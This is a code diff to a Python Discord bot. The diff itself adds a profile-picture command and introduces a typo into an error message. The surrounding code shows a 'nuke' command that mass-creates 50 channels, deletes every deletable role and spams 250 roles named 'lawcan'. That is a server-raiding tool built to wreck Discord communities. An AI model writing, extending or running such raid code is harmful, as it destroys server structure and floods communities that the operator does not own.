@@ -286,24 +286,17 @@ async def spamroles(ctx, number: int, role_name: str):
             break
 
 async def deleteroles(ctx):
-
     roles = ctx.guild.roles
-
-
     roles_to_delete = [role for role in roles if role.name != "@everyone" and role != ctx.guild.me.top_role]
-
-
     for role in roles_to_delete:
         try:
             await role.delete()
         except discord.Forbidden:
-            await ctx.send("Cannot delete roles. Missing permission.")
+            await ctx.send("Cannot delete roles. Missing permies")
             return
         except discord.HTTPException as e:
             await ctx.send(f"HTTP error occurred while deleting role {role.name}: {e}")
             return
-
-
 
 @bot.command()
 async def search(ctx, *, query: str):
@@ -462,5 +455,12 @@ async def nuke(ctx):
     await createchannels(ctx, number=50, channel_name="lawcan")
     await deleteroles(ctx)
     await spamroles(ctx, number=250, role_name="lawcan")
+
+@bot.command()
+async def getpfp(ctx, member: discord.User = None):
+    if member is None:
+        member = ctx.author
+    pfp = member.avatar.url
+    await ctx.send(f"{pfp}")
 
 bot.run(TOKEN)
